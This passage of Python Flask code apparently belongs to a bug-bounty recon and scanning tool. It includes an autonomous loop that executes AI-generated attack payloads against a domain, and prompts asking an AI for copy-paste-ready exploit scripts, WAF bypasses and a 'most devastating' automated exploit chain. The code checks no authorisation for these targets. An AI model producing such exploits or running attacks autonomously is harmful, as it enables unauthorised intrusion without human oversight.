    if not (fid and domain): return jsonify({"error":"finding_id and domain required"}), 400
    try:
        finds  = db.get_findings(domain)
        target = next((f for f in finds if str(f.get("id","")) == str(fid)), None)
        if not target: return jsonify({"error":"finding not found"}), 404
        from engine.auto_hunt import ai_filter_finding
        result = ai_filter_finding(target)
        # Auto-mark if Claude says false_positive
        if result.get("verdict") == "false_positive":
            if hasattr(db, "mark_false_positive"):
                db.mark_false_positive(int(fid))
        return jsonify(result)
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/findings/<path:domain>/ai_filter_all", methods=["POST"])
def findings_ai_filter_all(domain):
    """Batch AI false-positive filter for a domain (runs async)."""
    domain = _domain(domain)
    if not domain: return jsonify({"error":"domain required"}), 400
    import threading
    def _run():
        try:
            from engine.auto_hunt import ai_filter_finding
            finds = db.get_findings(domain)
            for f in finds:
                if f.get("false_pos") or f.get("confirmed"): continue
                result = ai_filter_finding(f)
                fid = f.get("id")
                if result.get("verdict") == "false_positive" and fid:
                    if hasattr(db,"mark_false_positive"):
                        try: db.mark_false_positive(int(fid))
                        except: pass
        except Exception as e:
            log.error(f"ai_filter_all: {e}")
    threading.Thread(target=_run, daemon=True).start()
    return jsonify({"ok": True, "msg": "AI filter started in background"})


# ── Auto-Hunt Mode ────────────────────────────────────────────────────────────
@app.route("/autohunt/start", methods=["POST"])
def autohunt_start():
    """Start autonomous hunt: findings → Claude → new payloads → execute → repeat."""
    p       = request.get_json(silent=True, force=True) or {}
    domain  = _domain(p.get("domain",""))
    max_iter= int(p.get("max_iterations", 3))
    if not domain: return jsonify({"error":"domain required"}), 400

    import threading
    def _hunt_loop():
        try:
            from engine.auto_hunt import auto_hunt_iteration, execute_hunt_payloads
            from engine.auto_hunt import ai_filter_finding
            waf_info = db.get_waf(domain) or {}
            waf      = waf_info.get("vendor","")
            for iteration in range(1, max_iter + 1):
                log.info(f"[autohunt] domain={domain} iteration={iteration}/{max_iter}")
                finds = db.get_findings(domain)
                ends  = db.get_endpoints(domain, limit=500)
                # Get next payloads from Claude
                plan     = auto_hunt_iteration(finds, domain, ends, waf)
                payloads = plan.get("payloads", [])
                if not payloads:
                    log.info(f"[autohunt] Claude says: {plan.get('next_action','done')}")
                    break
                # Execute payloads
                new_finds = execute_hunt_payloads(payloads)
                # Save new findings
                for nf in new_finds:
                    db.add_finding(domain, nf)
                log.info(f"[autohunt] iteration {iteration}: {len(new_finds)} new findings")
                if plan.get("next_action") == "report": break
        except Exception as e:
            log.error(f"autohunt: {e}")
    threading.Thread(target=_hunt_loop, daemon=True).start()
    return jsonify({"ok": True, "domain": domain, "max_iterations": max_iter})


# ── Natural Language Scan ─────────────────────────────────────────────────────
@app.route("/scan/nl", methods=["POST"])
def scan_nl():
    """Parse natural language scan request and start scan."""
    p      = request.get_json(silent=True, force=True) or {}
    query  = p.get("query","").strip()
    domain = _domain(p.get("domain",""))
    if not (query and domain): return jsonify({"error":"query and domain required"}), 400
    try:
        from engine.auto_hunt import parse_nl_scan
        ends   = db.get_endpoints(domain, limit=2000)
        result = parse_nl_scan(query, ends)
        bugs   = result.get("bugs",[])
        filtered_ends = result.get("filtered_endpoints", ends)
        return jsonify({
            "ok":       True,
            "bugs":     bugs,
            "endpoints":len(filtered_ends),
            "reasoning":result.get("reasoning",""),
            "start_url":f"/scan?domain={domain}&" + "&".join(f"bugs={b}" for b in bugs),
        })
    except Exception as e:
        return jsonify({"error": str(e)}), 500


# ── Auto Diff Snapshot ────────────────────────────────────────────────────────
@app.route("/diff/auto_snapshot", methods=["POST"])
def diff_auto_snapshot():
    import os as _os; _os.makedirs("data/snapshots", exist_ok=True)
    """Take a snapshot at scan start and compare at scan end. Called by JS after scan."""
    p      = request.get_json(silent=True, force=True) or {}
    domain = _domain(p.get("domain",""))
    action = p.get("action","snap")  # snap | compare
    if not domain: return jsonify({"error":"domain required"}), 400
    try:
        snap = MONITOR.save_snapshot(domain, db)
        if action == "compare":
            snaps = MONITOR.list_snapshots(domain)
            if len(snaps) >= 2:
                diff = MONITOR.diff_between(domain, snaps[-2]["ts"], snaps[-1]["ts"])
                new_vulns = [f for f in diff.get("findings_added",[]) if f]
                fixed     = [f for f in diff.get("findings_removed",[]) if f]
                return jsonify({
                    "ok":True, "snap":snap["ts"],
                    "new_findings":    len(new_vulns),
                    "fixed_findings":  len(fixed),
                    "new_subdomains":  len(diff.get("subs_added",[])),
                    "new_endpoints":   len(diff.get("endpoints_added",[])),
                    "diff":            diff,
                })
        return jsonify({"ok":True, "snap":snap["ts"], "subs":snap["subs_count"]})
    except Exception as e:
        return jsonify({"error": str(e)}), 500


# ── Usage Tracking ────────────────────────────────────────────────────────────
@app.route("/usage", methods=["GET"])
def usage_stats():
    """Return usage metrics for all scanned domains."""
    try:
        all_domains = db.list_domains() if hasattr(db,"list_domains") else []
        stats = []
        for d in all_domains[:50]:
            dom = _domain(d.get("domain","") if isinstance(d,dict) else d)
            if not dom: continue
            stats.append({
                "domain":    dom,
                "findings":  db.count_findings(dom) if hasattr(db,"count_findings") else 0,
                "endpoints": db.count_endpoints(dom),
                "subs":      db.count_subs(dom),
            })
        return jsonify({"domains": len(stats), "stats": stats})
    except Exception as e:
        return jsonify({"error": str(e)}), 500


# ══════════════════════════════════════════════════════════════════════════════
# ELITE AI ROUTES — Auto-exploit, Nuclei template gen, Smart scope, FP filter
# ══════════════════════════════════════════════════════════════════════════════

@app.route("/ai/auto_exploit", methods=["POST"])
def ai_auto_exploit():
    """AI generates a ready-to-run exploit script for a confirmed finding."""
    import queue as _q, threading
    p       = request.get_json(silent=True, force=True) or {}
    d       = _domain(p.get("domain",""))
    finding = p.get("finding", {})
    if not finding:
        return jsonify({"error":"finding required"}), 400

    tech     = db.get_tech(d)
    meta     = db.get_meta(d) or {}
    waf      = meta.get("waf","")
    stream_q = _q.Queue()

    def _gen():
        try:
            from engine.ai_agent import _claude, _ctx
            bug   = finding.get("bug","?").upper()
            url   = finding.get("url","")
            poc   = finding.get("poc","")
            param = finding.get("param","")
            tech_str = ', '.join(tech[:8]) if tech else "Unknown"
            prompt = f"""Generate a COMPLETE, WORKING exploit script for this confirmed finding:

Bug: {bug}
URL: {url}
Parameter: {param}
PoC: {poc}
Tech Stack: {tech_str}
WAF: {waf or 'None'}

Create a Python script that:
1. Confirms the vulnerability is still present
2. Demonstrates maximum impact (data extraction / account takeover / etc.)
3. Handles common WAF bypass if WAF detected
4. Outputs clear evidence for the bug bounty report

Then provide:
- curl one-liner proof
- Burp Suite request (raw HTTP)
- Impact statement for H1 report

Make it COPY-PASTE READY. No explanations, just working code."""

            messages = [{"role":"user","content":prompt}]
            _claude(messages, max_tokens=2000, stream_q=stream_q)
        except Exception as e:
            stream_q.put({"type":"ai_chunk","text":f"\n\n⚠ Error: {{e}}"})
        finally:
            stream_q.put(None)

    threading.Thread(target=_gen, daemon=True).start()
    return Response(
        (_sse(item) for item in iter(stream_q.get, None)),
        mimetype="text/event-stream",
        headers={"Cache-Control":"no-cache","X-Accel-Buffering":"no"})


@app.route("/ai/nuclei_template", methods=["POST"])
def ai_nuclei_template():
    """AI generates a custom Nuclei template from a confirmed finding."""
    import queue as _q, threading
    p       = request.get_json(silent=True, force=True) or {}
    d       = _domain(p.get("domain",""))
    finding = p.get("finding", {})
    if not finding:
        return jsonify({"error":"finding required"}), 400

    stream_q = _q.Queue()

    def _gen():
        try:
            from engine.ai_agent import _claude
            bug     = finding.get("bug","vuln")
            url     = finding.get("url","")
            poc     = finding.get("poc","")
            payload = finding.get("payload","") or finding.get("value","")
            param   = finding.get("param","")
            sev     = finding.get("severity","medium")

            import urllib.parse as _up
            try:
                parsed = _up.urlparse(url)
                path   = parsed.path
                host   = parsed.scheme + "://" + parsed.netloc
            except Exception:
                path = url; host = url

            prompt = f"""Generate a production-ready Nuclei YAML template for this finding:

Bug Type: {bug}
URL: {url}
Path: {path}
Parameter: {param}
Payload: {payload}
PoC: {poc}
Severity: {sev}

Requirements:
- Valid Nuclei v3 YAML format
- Use {{{{BaseURL}}}} for the host
- Include matchers that confirm the vulnerability (not just HTTP 200)
- Add extractors if data can be extracted
- Include metadata: id, name, author, severity, description, tags
- Test both GET and POST if applicable
- WAF-bypass variants in the payload list

Output ONLY the YAML template, no explanation."""

            messages = [{"role":"user","content":prompt}]
            _claude(messages, max_tokens=1500, stream_q=stream_q)
        except Exception as e:
            stream_q.put({"type":"ai_chunk","text":f"\n\n⚠ Error: {{e}}"})
        finally:
            stream_q.put(None)

    threading.Thread(target=_gen, daemon=True).start()
    return Response(
        (_sse(item) for item in iter(stream_q.get, None)),
        mimetype="text/event-stream",
        headers={"Cache-Control":"no-cache","X-Accel-Buffering":"no"})


@app.route("/ai/scope_suggest", methods=["POST"])
def ai_scope_suggest():
    """AI analyzes the scan and suggests the highest-value targets to focus on."""
    import queue as _q, threading
    p         = request.get_json(silent=True, force=True) or {}
    d         = _domain(p.get("domain",""))
    findings  = db.get_findings(d)
    hosts     = db.get_hosts(d)
    tech      = db.get_tech(d)
    endpoints = db.get_endpoints(d, limit=500)
    stream_q  = _q.Queue()

    def _gen():
        try:
            from engine.ai_agent import _claude, _ctx
            ctx = _ctx(d, findings, tech, "", [], endpoints,
                       hosts.get("subs_count",0), hosts.get("active_count",0))

            # Summarize endpoints by subdomain
            from collections import Counter
            import urllib.parse as _up
            sub_counts = Counter()
            for ep in endpoints:
                try: sub_counts[_up.urlparse(ep).netloc] += 1
                except: pass

            top_subs = sub_counts.most_common(15)
            sub_summary = "\n".join(f"  {c:4d} endpoints — {s}" for s,c in top_subs)

            prompt = f"""{ctx}

Endpoint distribution by subdomain:
{sub_summary}

Identify the TOP 5 HIGHEST-VALUE TARGETS to focus on RIGHT NOW:

For each target:
**[#N] {'{'}subdomain{'}'} — {'{'}why it's high value{'}'}**
- Attack surface: [key endpoints/parameters]
- Best attack vectors: [specific bugs to try]
- Tool to use: [exact command]
- Expected finding: [what you think is there]
- Bounty potential: [$X - $Y]

Then:
**SKIP LIST** — subdomains not worth testing (explain why)
**30-MINUTE PLAN** — exact sequence of 5 actions to maximize bounty"""

            messages = [{"role":"user","content":prompt}]
            _claude(messages, max_tokens=2000, stream_q=stream_q)
        except Exception as e:
            stream_q.put({"type":"ai_chunk","text":f"\n\n⚠ Error: {{e}}"})
        finally:
            stream_q.put(None)

    threading.Thread(target=_gen, daemon=True).start()
    return Response(
        (_sse(item) for item in iter(stream_q.get, None)),
        mimetype="text/event-stream",
        headers={"Cache-Control":"no-cache","X-Accel-Buffering":"no"})


@app.route("/ai/fp_filter", methods=["POST"])
def ai_fp_filter():
    """AI batch false-positive filter — scores all findings and marks likely FPs."""
    p        = request.get_json(silent=True, force=True) or {}
    d        = _domain(p.get("domain",""))
    findings = db.get_findings(d)
    if not findings:
        return jsonify({"filtered":[], "fp_count":0, "tp_count":0})

    try:
        from engine.ai_analyst import ai_filter_false_positives
        result = ai_filter_false_positives(findings, d)
        # Save FP flags back to DB
        fp_count = sum(1 for r in result if not r.get("is_tp", True))
        return jsonify({
            "filtered": result,
            "fp_count": fp_count,
            "tp_count": len(result) - fp_count,
            "total": len(result)
        })
    except Exception as e:
        return jsonify({"error": str(e)}), 500


@app.route("/ai/chain_attack", methods=["POST"])
def ai_chain_attack():
    """AI creates a step-by-step chain attack plan from multiple findings."""
    import queue as _q, threading
    p        = request.get_json(silent=True, force=True) or {}
    d        = _domain(p.get("domain",""))
    findings = db.get_findings(d)
    chains   = db.get_chains(d) or []
    tech     = db.get_tech(d)
    stream_q = _q.Queue()

    def _gen():
        try:
            from engine.ai_agent import _claude, _ctx
            ctx = _ctx(d, findings, tech, "", chains)

            prompt = f"""{ctx}

Design the MOST DEVASTATING EXPLOIT CHAIN possible from these findings.

## Kill Chain Design
Map the exact path from initial access to maximum impact.

## Step-by-Step Execution
For each step:
```
STEP N: [action]
Tool: [exact command]
Expected: [what you get]
Next: [what this enables]
```

## Full Automated Chain Script
Python/bash script that executes the entire chain automatically.

## Business Impact Statement
For the H1 report: what data/systems does this chain compromise?

## CVSS Score for Chain
Higher than individual bugs — calculate the chained CVSS.

## Timeline
Estimated time from initial access to full compromise."""

            messages = [{"role":"user","content":prompt}]
            _claude(messages, max_tokens=2500, stream_q=stream_q)
        except Exception as e:
            stream_q.put({"type":"ai_chunk","text":f"\n\n⚠ Error: {{e}}"})
        finally:
            stream_q.put(None)

    threading.Thread(target=_gen, daemon=True).start()
    return Response(
        (_sse(item) for item in iter(stream_q.get, None)),
        mimetype="text/event-stream",
        headers={"Cache-Control":"no-cache","X-Accel-Buffering":"no"})


@app.route("/ai/report_full", methods=["POST"])
def ai_report_full():
    """AI generates a complete pentest report (PDF-quality) for all findings."""
    import queue as _q, threading
    p         = request.get_json(silent=True, force=True) or {}
    d         = _domain(p.get("domain",""))
    findings  = db.get_findings(d)
    tech      = db.get_tech(d)
    hosts     = db.get_hosts(d)
    chains    = db.get_chains(d) or []
    meta      = db.get_meta(d) or {}
    stream_q  = _q.Queue()

    crits = [f for f in findings if f.get("severity")=="critical"]
    highs = [f for f in findings if f.get("severity")=="high"]
    meds  = [f for f in findings if f.get("severity")=="medium"]

    def _gen():
        try:
            from engine.ai_agent import _claude, SYSTEM_REPORT
            findings_detail = "\n".join([
                f"## [{f.get('severity','?').upper()}] {f.get('bug','?').upper()}\n"
                f"URL: {f.get('url','')}\n"
                f"PoC: {f.get('poc','')[:200]}\n"
                f"Impact: {f.get('impact','')[:150]}\n"
                for f in (crits+highs+meds)[:20]
            ])

            prompt = f"""Write a COMPLETE professional penetration test report for {d}:

## Executive Summary
Target: {d}
Scope: {hosts.get('subs_count',0)} subdomains, {hosts.get('active_count',0)} live hosts
Tech Stack: {', '.join(tech[:10]) if tech else 'Unknown'}
Assessment Period: This scan session

Risk Distribution:
- Critical: {len(crits)}
- High: {len(highs)}
- Medium: {len(meds)}
- Total Findings: {len(findings)}

## Findings Detail
{findings_detail}

Write a full report with:
1. Executive Summary (C-level readable)
2. Risk Score & Business Impact
3. Detailed Finding Writeups (one per finding, with PoC)
4. Attack Chains (if any chained vulnerabilities)
5. Remediation Roadmap (prioritized by risk)
6. Technical Appendix

Format: Professional markdown, ready for PDF export."""

            messages = [{"role":"user","content":prompt}]
            _claude(messages, system=SYSTEM_REPORT, max_tokens=4000, stream_q=stream_q)
        except Exception as e:
            stream_q.put({"type":"ai_chunk","text":f"\n\n⚠ Error: {{e}}"})
        finally:
            stream_q.put(None)

    threading.Thread(target=_gen, daemon=True).start()
    return Response(
        (_sse(item) for item in iter(stream_q.get, None)),
        mimetype="text/event-stream",
        headers={"Cache-Control":"no-cache","X-Accel-Buffering":"no"})


# ══ RESTORED ROUTES (from debug_app) ══


@app.route("/active_tech")
def active_tech():
    """
    Return detected tech stack for a domain from cached DB data only.
    Hard limit: must respond in under 2 seconds.
    Never runs external commands. Never waits for write lock.
    """
    import time as _at
    _t0 = _at.time()
    d   = _domain(request.args.get("domain", ""))
    if not d:
        return jsonify({"tech": [], "source": "no_domain"})

    try:
        # get_tech_fast uses a short-timeout read-only SQLite connection
        tech = db.get_tech_fast(d, timeout_ms=1500)
        dur  = round(_at.time() - _t0, 3)
        if tech:
            log.info(f"[active_tech] source=db count={len(tech)} duration={dur}s")
            return jsonify({"tech": tech, "source": "db", "duration_s": dur})
        else:
            log.info(f"[active_tech] source=cache_empty duration={dur}s")
            return jsonify({
                "tech":    [],
                "source":  "cache_empty",
                "warning": "tech detection has not completed yet",
                "duration_s": dur,
            })
    except Exception as e:
        dur = round(_at.time() - _t0, 3)
        log.warning(f"[active_tech] timeout duration={dur}s error={e}")
        return jsonify({
            "tech":    [],
            "source":  "timeout",
            "warning": "active_tech timed out",
            "duration_s": dur,
        })

# ── WAF detection ─────────────────────────────────────────────────────────────


@app.route("/ai/recon_tip", methods=["POST"])
def ai_recon_tip():
    """Generate a contextual tip for a recon event."""
    p          = request.get_json(silent=True) or {}
    event_type = p.get("event","tech_detected")
    data       = p.get("data",{})
    from engine.ai_recon import generate_recon_tip
    tip = generate_recon_tip(event_type, data)
    return jsonify({"tip": tip})


@app.route("/ai/tech_cves", methods=["GET","POST"])
def ai_tech_cves():
    """Instant CVE lookup for detected technologies — no API key needed."""
    p      = request.get_json(silent=True) or {}
    domain = _domain(request.args.get("domain","") or p.get("domain",""))
    tech   = p.get("tech",[]) or db.get_tech(domain)
    from engine.ai_recon import get_tech_cves
    cves = get_tech_cves(tech)
    # Also emit these as findings if critical
    for cve in cves:
        if cve["severity"] == "critical" and domain:
            db.add_finding(domain, {
                "bug":         "cve",
                "severity":    "critical",
                "title":       f"Potential {cve['cve']}: {cve['description'][:80]}",
                "url":         f"https://{domain}",
                "poc":         f"# Check: {cve['description']}",
                "confidence":  65,
                "cve_id":      cve["cve"],
                "tool":        "ai_cve_matcher",
            })
    return jsonify({"cves": cves, "count": len(cves), "tech": tech})


@app.route("/api/health")
def api_health():
    """Comprehensive health check — all subsystems."""
    import time, shutil, os as _os
    try:   domains = db.list_domains(); stor_ok = True
    except: domains = []; stor_ok = False

    sh_bin  = _os.path.exists("secret_hunter") and _os.access("secret_hunter", _os.X_OK)
    nuclei  = bool(shutil.which("nuclei"))
    httpx   = bool(shutil.which("httpx"))
    ai_ok   = bool(_os.environ.get("ANTHROPIC_API_KEY",""))

    warnings = []
    if not sh_bin:
        warnings.append("secret_hunter binary missing — copy binary to app folder (see secret_hunter_setup.md)")
    if not ai_ok:
        warnings.append("ANTHROPIC_API_KEY not set — AI features disabled")

    return jsonify({
        "status":          "ok",
        "version":         "3.0",
        "storage":         "ok" if stor_ok else "error",
        "domains":         len(domains),
        "uptime":          round(time.time() - _START_TIME, 1),
        "secret_hunter":   sh_bin,
        "secret_hunter_note": "binary found — ready to scan" if sh_bin else "binary missing — copy UnifiedSecretHunter to app root as 'secret_hunter'",
        "nuclei":          nuclei,
        "httpx":           httpx,
        "ai_enabled":      ai_ok,
        "oob_port":        _os.environ.get("OOB_HTTP_PORT","8088"),
        "warnings":        warnings,
    })

@app.after_request
def add_security_headers(response):
    """Add security headers to all responses."""
    # Don't override for SSE streams
    if response.content_type and "text/event-stream" not in response.content_type:
        response.headers["X-Content-Type-Options"] = "nosniff"
        response.headers["X-Frame-Options"]        = "SAMEORIGIN"
        response.headers["Referrer-Policy"]        = "strict-origin-when-cross-origin"
        # Cache control for API responses
        if request.path.startswith("/api/") or request.path.startswith("/auth/"):
            response.headers["Cache-Control"] = "no-store"
    return response


@app.route("/api/system-resources")
def system_resources():
    """Real-time CPU, RAM, disk, network metrics."""
    try:
        import psutil
        cpu   = psutil.cpu_percent(interval=0.1)
        mem   = psutil.virtual_memory()
        disk  = psutil.disk_usage('/')
        net   = psutil.net_io_counters()
        swap  = psutil.swap_memory()
        proc  = __import__('os').getpid()
        try:
            p     = psutil.Process(proc)
            p_cpu = round(p.cpu_percent(interval=None), 1)
            p_mem = round(p.memory_info().rss / 1e6, 1)
            p_thr = p.num_threads()
        except Exception:
            p_cpu, p_mem, p_thr = 0, 0, 0

        with _resource_lock:
            history = list(_resource_history)

        current = {
            "ts":        __import__("time").strftime("%H:%M:%S"),
            "cpu":       round(cpu, 1),
            "cpu_count": psutil.cpu_count(),
            "mem_pct":   round(mem.percent, 1),
            "mem_used":  round(mem.used / 1e9, 2),
            "mem_total": round(mem.total / 1e9, 2),
            "mem_avail": round(mem.available / 1e9, 2),
            "swap_pct":  round(swap.percent, 1),
            "disk_pct":  round(disk.percent, 1),
            "disk_used": round(disk.used / 1e9, 1),
            "disk_total":round(disk.total / 1e9, 1),
            "disk_free": round(disk.free / 1e9, 1),
            "net_sent":  round(net.bytes_sent / 1e6, 1),
            "net_recv":  round(net.bytes_recv / 1e6, 1),
            "proc_cpu":  p_cpu,
            "proc_mem":  p_mem,
            "proc_thr":  p_thr,
            "warnings":  [],
        }
        if cpu > 90:       current["warnings"].append({"level":"critical","msg":f"CPU critical: {cpu}%"})
        elif cpu > 75:     current["warnings"].append({"level":"warning", "msg":f"CPU high: {cpu}%"})
        if mem.percent>90: current["warnings"].append({"level":"critical","msg":f"RAM critical: {mem.percent}%"})
        elif mem.percent>80: current["warnings"].append({"level":"warning","msg":f"RAM high: {mem.percent}%"})
        if disk.percent>95:current["warnings"].append({"level":"critical","msg":f"Disk critical: {disk.percent}%"})
        elif disk.percent>85:current["warnings"].append({"level":"warning","msg":f"Disk high: {disk.percent}%"})
        if swap.percent>50:current["warnings"].append({"level":"warning","msg":f"Swap high: {swap.percent}% (memory pressure)"})

        return jsonify({"current": current, "history": history})
    except ImportError:
        return jsonify({"error": "psutil not installed", "current": {}, "history": []})


@app.route("/api/system-resources/warnings")
def system_warnings():
    """Latest warnings only."""
    with _resource_lock:
        latest = _resource_history[-1] if _resource_history else {}
    return jsonify({"warnings": latest.get("warnings", []), "ts": latest.get("ts","")})



# ── Auto File Cleanup ────────────────────────────────────────────────────────


@app.route("/asn_expand", methods=["POST"])
def asn_expand():
    payload = request.get_json(silent=True, force=True) or {}
    d = _domain(payload.get("domain",""))
    # Run in background — ASN lookup can take minutes, don't block the client
    def _do_asn():
        try:
            asn_data = get_company_ranges(d)
            _sess(d)["asn"] = asn_data
            db.save_meta(d, {"asn": asn_data})
            log.info(f"[asn] {d}: ASN={asn_data.get('asn')} ranges={len(asn_data.get('ranges',[]))}")
        except Exception as e:
            log.debug(f"[asn] {d}: {e}")
    __import__("threading").Thread(target=_do_asn, daemon=True).start()
    # Return immediately with whatever we have cached
    cached_asn = _sess(d).get("asn") or db.get_meta(d).get("asn") or {}
    return jsonify({"ok": True, "async": True, "cached": cached_asn})

# ── JS analysis ───────────────────────────────────────────────────────────────


@app.route("/audit_log")
def audit_log_route():
    scope    = request.args.get("scope","")
    username = request.args.get("username","")
    limit    = int(request.args.get("limit","200"))
    try:
        from engine.collaboration import get_collab_db
        cdb = get_collab_db(db.root.parent if hasattr(db,"root") else "./data")
        return jsonify({"log": cdb.get_audit_log(scope or None, username or None, limit)})
    except Exception as e:
        return jsonify({"error":str(e)}), 500


# ══════════════════════════════════════════════════════════════════════════════
# HTTP PROXY
# ══════════════════════════════════════════════════════════════════════════════


@app.route("/auth_status")
def auth_status():
    d = _domain(request.args.get("domain",""))
    auth = _sess(d)["auth"]
    return jsonify({
        "authenticated": auth.is_authenticated(),
        "username":      auth.session.username,
        "has_token":     bool(auth.session.token),
        "has_cookies":   bool(auth.session.cookies),
    })

# ── OOB server ────────────────────────────────────────────────────────────────


@app.route("/chain_poc/<chain_id>")
def chain_poc(chain_id):
    d = _domain(request.args.get("domain",""))
    chains = db.get_chains(d)
    chain = next((c for c in chains if c.get("id") == chain_id), None)
    if not chain:
        return jsonify({"error": "chain not found"}), 404
    return jsonify(chain)

# ── Authentication ────────────────────────────────────────────────────────────


@app.route("/chains")
def get_chains():
    d = _domain(request.args.get("domain",""))
    chains = db.get_chains(d) or _sess(d).get("chains",[])
    return jsonify({"chains": chains})


@app.route("/check_domain")
def check_domain():
    d = _domain(request.args.get("domain",""))
    return jsonify({"has_results": bool(d and db.domain_exists(d)), "domain": d})


@app.route("/cicd/gitlab_config")
def cicd_gitlab():
    """Generate GitLab CI configuration."""
    tmr_host = request.args.get("host","http://your-tmr-server:3333")
    target   = request.args.get("target","https://staging.example.com")
    config   = f"""# TheMasterRecon AI — GitLab CI Security Scan
# Add to .gitlab-ci.yml

security-scan:
  stage: test
  image: curlimages/curl:latest
  variables:
    TMR_HOST: "{tmr_host}"
    SCAN_TARGET: "{target}"
  script:
    - DOMAIN=$(echo "$SCAN_TARGET" | sed 's|https://||;s|http://||;s|/.*||')
    - echo "Scanning $DOMAIN"
    # Trigger recon
    - curl -s -X POST "$TMR_HOST/recon?domain=$DOMAIN&skip_subs=true" &
    - sleep 60
    # Run scan
    - curl -s "$TMR_HOST/scan?domain=$DOMAIN&bugs=xss,sqli,ssrf,cors,idor,misconfig" > /dev/null &
    - sleep 120
    # Check findings
    - FINDINGS=$(curl -s "$TMR_HOST/findings?domain=$DOMAIN")
    - CRITS=$(echo "$FINDINGS" | python3 -c "import json,sys; f=json.load(sys.stdin); print(sum(1 for x in f if x.get('severity')=='critical'))")
    - echo "Critical findings=$CRITS"
    - if [ "$CRITS" -gt 0 ]; then exit 1; fi
  artifacts:
    reports:
      # Download report from TMR
    when: always
  only:
    - merge_requests
    - main
"""
    return config, 200, {"Content-Type":"text/plain"}


@app.route("/cicd/jenkins_config")
def cicd_jenkins():
    """Generate Jenkinsfile."""
    tmr_host = request.args.get("host","http://your-tmr-server:3333")
    target   = request.args.get("target","https://staging.example.com")
    config   = f"""// TheMasterRecon AI — Jenkinsfile Security Scan
pipeline {{
    agent any
    environment {{
        TMR_HOST = '{tmr_host}'
        SCAN_TARGET = '{target}'
    }}
    stages {{
        stage('Security Scan') {{
            steps {{
                script {{
                    def domain = SCAN_TARGET.replaceAll('https?://', '').split('/')[0]
                    sh "curl -s -X POST $TMR_HOST/recon?domain=${{domain}}&skip_subs=true"
                    sleep(60)
                    sh "curl -s \"$TMR_HOST/scan?domain=${{domain}}&bugs=xss,sqli,ssrf,cors,idor\" > /dev/null"
                    sleep(120)
                    def findings = sh(returnStdout: true, 
                        script: "curl -s $TMR_HOST/findings?domain=${{domain}}")
                    def crits = sh(returnStdout: true,
                        script: "echo '${{findings}}' | python3 -c \"import json,sys; f=json.load(sys.stdin); print(sum(1 for x in f if x.get('severity')=='critical'))\"").trim()
                    if (crits.toInteger() > 0) {{
                        error("SECURITY SCAN FAILED: ${{crits}} critical findings!")
                    }}
                }}
            }}
        }}
    }}
    post {{
        always {{
            // Archive report
            sh "curl -s $TMR_HOST/escalate -X POST -H 'Content-Type: application/json' -d '{{"domain":"${{SCAN_TARGET}}"}}'  > security_report.md || true"
            archiveArtifacts 'security_report.md'
        }}
    }}
}}
"""
    return config, 200, {"Content-Type":"text/plain"}


@app.route("/cicd/webhook", methods=["POST"])
def cicd_webhook():
    """Receive CI/CD webhook to trigger automated scan."""
    payload    = request.get_json(silent=True, force=True) or {}
    event_type = request.headers.get("X-Gitlab-Event") or                  request.headers.get("X-GitHub-Event") or "push"

    # Extract target URL from various CI/CD platforms
    target = (payload.get("environment_url") or
              payload.get("deployment",{}).get("environment_url") or
              payload.get("target_url",""))

    if not target:
        return jsonify({"ok":False,"error":"No target URL in webhook payload"}), 400

    domain = urllib.parse.urlparse(target).netloc

    import threading as _th, queue as _q
    def _auto_scan():
        q = _q.Queue()
        try:
            from recon import run_recon
            opts = {"skip_subs":True,"skip_port":True}
            run_recon(domain, opts, q, db)
            run_scan(domain, ["xss","sqli","ssrf","cors","idor","misconfig"], q, db)
        except Exception as e:
            log.error(f"[webhook] auto-scan failed: {e}")

    _th.Thread(target=_auto_scan, daemon=True).start()
    log.info(f"[webhook] Auto-scan triggered for {domain} (event: {event_type})")
    return jsonify({"ok":True,"domain":domain,"message":f"Scan triggered for {domain}"})


# ── Built-in OOB Callback Server ─────────────────────────────────────────────


@app.route("/cleanup", methods=["POST"])
def cleanup_files():
    """Remove temp files older than retention period."""
    import glob, time as _t
    payload   = request.get_json(silent=True, force=True) or {}
    max_age_h = int(payload.get("max_age_hours", 24))
    removed   = []
    cutoff    = _t.time() - max_age_h * 3600
    patterns  = ["/tmp/tmp*.txt","/tmp/tmp*.json","/tmp/bugscan_*",
                 "/tmp/nuclei_*","/tmp/nmap_*"]
    for pat in patterns:
        for f in glob.glob(pat):
            try:
                if os.path.getmtime(f) < cutoff:
                    os.unlink(f)
                    removed.append(f)
            except Exception: pass
    # Also clean scan data older than max_age_h if requested
    if payload.get("clean_data"):
        data_dir = db.root if hasattr(db,"root") else None
        # don't auto-delete scan data without explicit flag
    return jsonify({"ok": True, "removed": len(removed), "files": removed[:20]})


@app.route("/cleanup/status")
def cleanup_status():
    """Disk usage of temp and data directories."""
    import glob, shutil as _sh
    tmp_files = glob.glob("/tmp/tmp*.txt") + glob.glob("/tmp/bugscan_*")
    tmp_size  = sum(os.path.getsize(f) for f in tmp_files if os.path.exists(f))
    data_size = 0
    data_dir  = getattr(getattr(db,"root",None),"__str__",lambda:"")()
    if data_dir and os.path.exists(data_dir):
        for root,_,files in os.walk(data_dir):
            data_size += sum(os.path.getsize(os.path.join(root,f))
                             for f in files if os.path.exists(os.path.join(root,f)))
    return jsonify({
        "tmp_files": len(tmp_files),
        "tmp_size_mb": round(tmp_size/1e6, 2),
        "data_size_mb": round(data_size/1e6, 2),
        "disk_free_gb": round(__import__("shutil").disk_usage("/").free/1e9, 2)
    })



# ── Scan state (resume support) ───────────────────────────────────────────────


@app.route("/db/stats")
def db_stats():
    """Database and storage statistics."""
    import os
    domain = _domain(request.args.get("domain",""))
    stats = {}
    if domain:
        stats = {
            "domain":    domain,
            "subs":      db.count_subs(domain) if hasattr(db,"count_subs") else len(db.get_subs(domain)) if hasattr(db,"get_subs") else 0,
            "endpoints": db.count_endpoints(domain),
            "findings":  db.count_findings(domain) if hasattr(db,"count_findings") else 0,
        }
    # Storage type
    stor_type = "SQLite" if "storage_sqlite" in str(type(db)) else "JSON"
    data_dir  = str(db.root) if hasattr(db,"root") else "unknown"
    try:
        import shutil
        total, used, free = shutil.disk_usage(data_dir)
        disk = {"total_gb": round(total/1e9,1),"used_gb": round(used/1e9,1),"free_gb": round(free/1e9,1)}
    except: disk = {}
    return jsonify({**stats, "storage_type": stor_type, "data_dir": data_dir, "disk": disk})


@app.route("/delete_all", methods=["POST"])
def delete_all():
    db.delete_all()
    with _lock: _sessions.clear()
    return jsonify({"ok": True})

# ── Recon SSE ─────────────────────────────────────────────────────────────────


@app.route("/delete_domain", methods=["POST"])
def delete_domain():
    d = _domain(request.args.get("domain","") or (request.get_json(silent=True) or {}).get("domain",""))
    db.delete_domain(d)
